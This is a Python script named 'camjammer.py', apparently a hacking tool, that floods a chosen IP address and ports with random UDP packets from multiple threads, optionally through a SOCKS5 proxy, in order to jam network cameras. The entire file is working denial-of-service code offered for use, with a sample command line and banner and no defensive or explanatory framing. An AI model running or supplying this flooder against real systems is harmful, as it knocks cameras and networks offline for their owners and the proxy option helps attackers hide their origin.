#python camjammer.py -ip 192.168.1.5 -port 80,443 -thread 5
import socket
import socks
import random
import threading
import argparse

def internet_connection():
    try:
        socket.gethostbyname("www.google.com")
        return True
    except socket.gaierror:
        return False

def home_logo():
    print("""
        ####   ##     ##      ###        #####      #######     #######
         ##    ##     ##     ## ##      ##   ##    ##     ##   ##     ##
         ##    ##     ##    ##   ##    ##     ##   ##     ##   ##     ##
         ##    #########   ##     ##   ##     ##    #######     ########
         ##    ##     ##   #########   ##     ##   ##     ##          ##
         ##    ##     ##   ##     ##    ##   ##    ##     ##   ##     ##
        ####   ##     ##   ##     ##     #####      #######     #######

IHA089: Navigating the Digital Realm with Code and Security - Where Programming Insights Meet Cyber Vigilance.
    """)

def send_random_udp_packets(target_ip, target_port, proxy_ip=None, proxy_port=None, stop_event=None):
    sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
    if proxy_ip and proxy_port:
        sock.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
    
    while not stop_event.is_set():
        try:
            random_data = bytes(random.getrandbits(8) for _ in range(1024))
            sock.sendto(random_data, (target_ip, target_port))
            print(f"Sent random UDP packet: {random_data[:20]}...")
        except Exception as e:
            print(f"An error occurred: {e}")
            break

def multiple_threads(ports, total_thread, ip, proxy_ip=None, proxy_port=None):
    stop_event = threading.Event()
    threads = []

    for port in ports:
        for _ in range(total_thread):
            port = int(port)
            thread = threading.Thread(target=send_random_udp_packets, args=(ip, port, proxy_ip, proxy_port, stop_event))
            threads.append(thread)
            thread.start()
    
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("Stopping threads...")
        stop_event.set()
        for thread in threads:
            thread.join()

def main():
    parser = argparse.ArgumentParser(description='cam-jammer')
    parser.add_argument('-ip', '--ip', type=str, help='Target IP address', required=True)
    parser.add_argument('-port', '--port', type=str, help='Target port numbers (choose multiple ports separated by comma)', required=True)
    parser.add_argument('-thread', '--num_thread', type=int, help='Number of threads for each port', default=5)
    parser.add_argument('-proxy_ip', '--proxy_ip', type=str, help='Set proxy IP')
    parser.add_argument('-proxy_port', '--proxy_port', type=int, help='Set proxy PORT')

    args = parser.parse_args()
    ip = args.ip
    ports = args.port.split(",")
    num_thread = args.num_thread
    proxy_ip = args.proxy_ip
    proxy_port = args.proxy_port

    if internet_connection():
        home_logo()
        multiple_threads(ports, num_thread, ip, proxy_ip, proxy_port)
    else:
        print("No internet connection")

if __name__ == "__main__":
    main()
